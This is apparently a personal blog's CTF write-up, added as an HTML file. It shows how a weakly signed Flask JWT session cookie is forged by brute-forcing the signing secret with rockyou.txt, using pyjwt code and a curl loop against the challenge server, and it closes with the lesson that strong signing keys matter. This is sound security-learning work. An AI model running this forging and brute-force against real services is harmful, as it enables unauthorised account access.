@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>jwt</title>
+  <link rel="stylesheet" href="../css.css">
+  <header><p><a href=../../index.html>home/about-me</a> | <a href=../posts_main.html>posts</a></p></header>
+</head>
+<h2 id="problem">Problem</h2>
+<p>Upon visiting the provided URL, we are presented initially with an “Access denied” html page.</p>
+<p>After checking the html, I perused session storage and found a cookie in the form of a JWT.</p>
+<p>It got shoved into jwt.io and the payload was b64-encoded json struct.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a>{</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;logged_in&quot;</span><span class="op">:</span><span class="st">&quot;false&quot;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>I changed the polarity of the boolean and tried again, and got some fun flask errors. Fun, flask backend.</p>
+<p>I grabbed pyjwt and modified the example code to fit my purposes</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>payload_data <span class="op">=</span> {</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>    <span class="st">&quot;logged_in&quot;</span>: <span class="st">&quot;true&quot;</span>,</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a>token <span class="op">=</span> jwt.encode(</span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>    payload<span class="op">=</span>payload_data,</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    key<span class="op">=</span>secret</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>)</span></code></pre></div>
+<p>Since the secret was unknown to me, i decided to try brute-forcing with (some of) <code>rockyou.txt</code></p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>secrets <span class="op">=</span> <span class="bu">open</span>(<span class="st">&quot;rockyou.txt&quot;</span>, <span class="st">&#39;r&#39;</span>).readlines()[:<span class="op">-</span><span class="dv">50</span>]</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a>f <span class="op">=</span> <span class="bu">open</span>(<span class="st">&quot;tokens.txt&quot;</span>, <span class="st">&quot;w+&quot;</span>)</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> secret <span class="kw">in</span> secrets:</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    token <span class="op">=</span> jwt.encode(</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>        payload<span class="op">=</span>payload_data,</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>        key<span class="op">=</span>secret</span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    )</span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    f.write(token <span class="op">+</span> <span class="st">&quot;</span><span class="ch">\n</span><span class="st">&quot;</span>)</span></code></pre></div>
+<p>I then wrote a bash script to enumerate the tokens I generated (janky, i know, but it worked)</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="va">lines</span><span class="op">=</span><span class="va">$(</span><span class="fu">cat</span> tokens.txt<span class="va">)</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> line <span class="kw">in</span> <span class="va">$lines</span>          </span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="cf">do</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">curl</span> <span class="at">-v</span> <span class="at">-s</span> <span class="at">-k</span> <span class="st">&quot;GET&quot;</span> <span class="at">--cookie</span> <span class="st">&#39;session=$line&#39;</span> <span class="st">&#39;http://34.89.146.147:32555/&#39;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="cf">done</span></span></code></pre></div>
+<p>I tested the script to stdout for a few seconds, then get grepped for “CTF” and got the flag after 4 tries (the secret was <code>'password'</code>).</p>
+<h2 id="what-i-learned">What I learned</h2>
+<p>JWT is pronounced “jot”, and secure keys should be used for signing everything because bruteforcing passwords is trivial.</p>
